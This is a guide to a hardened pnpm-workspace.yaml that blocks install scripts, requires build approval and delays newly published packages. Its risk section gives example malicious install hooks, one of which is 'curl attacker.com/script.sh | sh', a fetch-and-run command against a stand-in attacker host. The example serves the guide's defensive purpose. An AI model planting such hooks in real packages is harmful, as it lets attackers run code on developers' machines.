# Secure pnpm v11.25.0 Configuration

This document describes the configuration applied in `pnpm-workspace.yaml` to harden dependency installation, reduce risks associated with malicious scripts, and maintain more controlled package manager behavior.

## Configured File

```yaml
# pnpm-workspace.yaml

packages:
  - "."

# =========================================================
# Security: installation scripts
# =========================================================

ignoreScripts: true
enablePrePostScripts: false
strictDepBuilds: true
dangerouslyAllowAllBuilds: false
allowBuilds: {}

# =========================================================
# Security: protection against newly published packages
# =========================================================

minimumReleaseAge: 1440
minimumReleaseAgeExclude: []

# =========================================================
# Security: strict dependency resolution
# =========================================================

strictPeerDependencies: true
autoInstallPeers: false
resolvePeersFromWorkspaceRoot: true

# =========================================================
# Optimization / consistency
# =========================================================

lockfile: true
sharedWorkspaceLockfile: true
dedupePeerDependents: true
preferOffline: true
reporter: append-only

# =========================================================
# Package manager management
# =========================================================

pmOnFail: download
```

---

# Configuration Objective

The main objective is to prevent npm dependencies from automatically executing code during installation.

Some packages may define scripts such as:

```json
{
  "scripts": {
    "preinstall": "node script.js",
    "install": "node install.js",
    "postinstall": "node postinstall.js",
    "prepare": "node prepare.js"
  }
}
```

These scripts may be legitimate, for example, when compiling native binaries, but they can also be used as an attack vector in supply-chain incidents.

This configuration applies a security policy based on:

```txt
block by default
review manually
approve only what is necessary
```

---

# `packages` Section

```yaml
packages:
  - "."
```

Defines which directories are part of the pnpm workspace.

In this case:

```yaml
- "."
```

indicates that the project root is the only package in the workspace.

## If the Project Were a Monorepo

For a monorepo, it could be changed to:

```yaml
packages:
  - "apps/*"
  - "packages/*"
```

Or for mixed projects:

```yaml
packages:
  - "."
  - "assets"
  - "apps/*"
  - "packages/*"
```

---

# Security: Installation Scripts

## `ignoreScripts: true`

```yaml
ignoreScripts: true
```

Prevents pnpm from executing scripts defined in the project's or its dependencies' `package.json` files during installation.

This blocks scripts such as:

```txt
preinstall
install
postinstall
prepare
```

This is one of the primary measures for reducing the risk of compromised dependencies attempting to execute code during installation.

## Risk Mitigated

It prevents scenarios in which a malicious dependency performs something like:

```json
{
  "scripts": {
    "postinstall": "node steal-env.js"
  }
}
```

or:

```json
{
  "scripts": {
    "preinstall": "curl attacker.com/script.sh | sh"
  }
}
```

## Important Consideration

This option may break legitimate packages that need to compile or download binaries during installation.

Common examples include:

```txt
esbuild
sharp
sqlite3
better-sqlite3
playwright
electron
node-sass
@swc/core
```

If a legitimate dependency needs to execute scripts, it must be explicitly approved.

---

## `enablePrePostScripts: false`

```yaml
enablePrePostScripts: false
```

Prevents pnpm from automatically executing `pre` and `post` scripts associated with the project's own scripts.

For example, if `package.json` contains:

```json
{
  "scripts": {
    "predev": "echo antes",
    "dev": "vite",
    "postdev": "echo despues"
  }
}
```

With this configuration, when running:

```bash
pnpm dev
```

pnpm should not automatically execute:

```bash
pnpm predev
pnpm postdev
```

This reduces implicit execution and makes behavior more predictable.

---

## `strictDepBuilds: true`

```yaml
strictDepBuilds: true
```

Causes installation to fail when dependencies contain unreviewed build scripts.

Instead of allowing scripts to run automatically, pnpm requires developers to review which dependencies want to execute scripts.

## Expected Behavior

If a dependency attempts to execute installation scripts and has not been approved, pnpm may display an error or warning indicating that there are ignored or unreviewed builds.

The correct action is not to enable permissions globally, but to review and approve only the packages that actually require them.

---

## `dangerouslyAllowAllBuilds: false`

```yaml
dangerouslyAllowAllBuilds: false
```

Prevents all dependencies from automatically executing scripts.

This option should remain set to `false`.

## Why It Should Not Be Enabled

Using the following configuration is not recommended:

```yaml
dangerouslyAllowAllBuilds: true
```

because it would allow any direct or transitive dependency to execute installation scripts, including future dependencies introduced through updates.

This would weaken the project's security policy.

---

## `allowBuilds: {}`

```yaml
allowBuilds: {}
```

Defines an explicit list of packages that are allowed or blocked from executing build scripts.

It is initially left empty to enforce a strict policy.

## Usage Example

If, after reviewing a dependency, it is determined that `esbuild` needs to execute legitimate scripts, it could be approved as follows:

```yaml
allowBuilds:
  esbuild: true
```

To explicitly block a package:

```yaml
allowBuilds:
  core-js: false
```

## Recommended Way to Manage This List

Use:

```bash
pnpm approve-builds
```

This command allows dependencies that want to execute build scripts to be reviewed interactively.

Approved dependencies are added to `allowBuilds` with a value of `true`.

Rejected dependencies are added with a value of `false`.

---

# Security: Protection Against Newly Published Packages

## `minimumReleaseAge: 1440`

```yaml
minimumReleaseAge: 1440
```

Prevents the installation of versions that were published too recently.

The value is expressed in minutes.

```txt
1440 minutes = 24 hours
```

## Objective

Mitigate attacks in which a malicious version is published to npm and removed shortly afterward.

With this configuration, the project avoids installing versions that are too recent, providing additional time for the community, security tools, or the registry itself to detect anomalies.

## Trade-off

It may prevent the immediate installation of a legitimate newly published version.

This is acceptable in projects where security and stability are prioritized over immediate access to new releases.

---

## `minimumReleaseAgeExclude: []`

```yaml
minimumReleaseAgeExclude: []
```

Allows specific packages to be excluded from the `minimumReleaseAge` rule.

It is currently empty, meaning that all packages must comply with the configured minimum waiting period.

## Example

If an internal package needed to be excluded:

```yaml
minimumReleaseAgeExclude:
  - "@empresa/paquete-interno"
```

It should not be used to exclude external packages without a clear reason.

---

# Security: Strict Dependency Resolution

## `strictPeerDependencies: true`

```yaml
strictPeerDependencies: true
```

Makes pnpm strict when handling peer dependency conflicts.

This helps detect compatibility problems instead of allowing ambiguous installations.

## Advantage

It prevents the project from working "by accident" with incompatible versions of shared dependencies.

## Potential Impact

It may cause installation errors if some libraries have incorrectly declared or incompatible peer dependencies.

In those cases, the correct approach is to explicitly resolve the required versions.

---

## `autoInstallPeers: false`

```yaml
autoInstallPeers: false
```

Prevents pnpm from automatically installing missing peer dependencies.

## Objective

Requires the project to explicitly declare the dependencies it needs.

This reduces implicit installations and makes the actual dependency tree clearer.

---

## `resolvePeersFromWorkspaceRoot: true`

```yaml
resolvePeersFromWorkspaceRoot: true
```

Allows peer dependencies to be resolved from the workspace root.

This helps maintain consistency in workspace-based projects or structures where multiple components share common dependencies.

---

# Optimization and Consistency

## `lockfile: true`

```yaml
lockfile: true
```

Keeps the `pnpm-lock.yaml` file enabled.

The lockfile is required for reproducible installations.

## Recommendation

The `pnpm-lock.yaml` file should be committed to Git.

It should not be added to `.gitignore`.

---

## `sharedWorkspaceLockfile: true`

```yaml
sharedWorkspaceLockfile: true
```

Uses a single shared lockfile for the entire workspace.

This makes it easier for all packages in the project to use a consistent dependency resolution.

---

## `dedupePeerDependents: true`

```yaml
dedupePeerDependents: true
```

Allows pnpm to deduplicate dependencies related to peer dependencies when possible.

## Benefit

Reduces unnecessary duplicates in the lockfile and dependency tree.

---

## `preferOffline: true`

```yaml
preferOffline: true
```

Instructs pnpm to prefer using the local store whenever possible.

## Benefit

It can speed up installations when dependencies already exist in the local cache.

## Consideration

This does not mean pnpm will never access the internet. If a dependency is missing or new resolution information is required, pnpm may query the registry.

---

## `reporter: append-only`

```yaml
reporter: append-only
```

Makes console output less dynamic and more suitable for logs.

This is useful in CI/CD environments or terminals where interactive output may be undesirable.

---

# Package Manager Management

## `managePackageManagerVersions: true`

```yaml
managePackageManagerVersions: true
```

Allows pnpm to respect the version declared in the `packageManager` field of `package.json`, when applicable.

Example:

```json
{
  "packageManager": "pnpm@10.26.0"
}
```

This helps ensure that all developers use a consistent pnpm version.

## Compatibility Note

In newer versions of pnpm, this configuration may change or be replaced by options such as `pmOnFail`.

If pnpm displays warnings related to this key, the current pnpm version should be reviewed and the configuration adjusted accordingly.

---

# Recommended Installation Workflow

## Secure Installation

```bash
pnpm install --ignore-scripts
```

## Secure Installation in CI/CD

```bash
pnpm install --frozen-lockfile --ignore-scripts
```

## Review Dependencies That Require Scripts

```bash
pnpm approve-builds
```

## Approve Only What Is Necessary

After running `pnpm approve-builds`, review changes to:

```txt
pnpm-workspace.yaml
pnpm-lock.yaml
```

Do not approve dependencies without understanding why they need to execute scripts.

---

# Recommended Policy

The project's general policy should be:

```txt
1. Do not execute scripts during installation by default.
2. Do not allow automatic builds from unknown dependencies.
3. Manually review dependencies that require scripts.
4. Approve only strictly necessary packages.
5. Commit pnpm-workspace.yaml and pnpm-lock.yaml to version control.
6. Use --frozen-lockfile in CI/CD.
```

---

# Dependencies That May Require Special Review

Some legitimate dependencies commonly require scripts to download binaries, compile native modules, or prepare files.

Examples:

```txt
esbuild
sharp
sqlite3
better-sqlite3
playwright
electron
node-sass
@swc/core
@parcel/watcher
```

If the project uses one of these dependencies, it may be necessary to explicitly approve it with:

```bash
pnpm approve-builds
```

or configure it manually:

```yaml
allowBuilds:
  esbuild: true
```

---

# Configuration That Should Not Be Used

Do not use:

```yaml
dangerouslyAllowAllBuilds: true
```

Disabling the strict policy without justification is also not recommended:

```yaml
strictDepBuilds: false
```

Nor should scripts be globally enabled without review.

---

# Summary

This configuration hardens pnpm against supply-chain attacks involving installation scripts.

The project is configured to:

```txt
block scripts by default
fail on unreviewed builds
avoid packages that were published too recently
enforce strict dependency resolution
maintain reproducible installations
```

The trade-off is that some legitimate dependencies may require manual approval.

This cost is intentional and is part of the project's security policy.
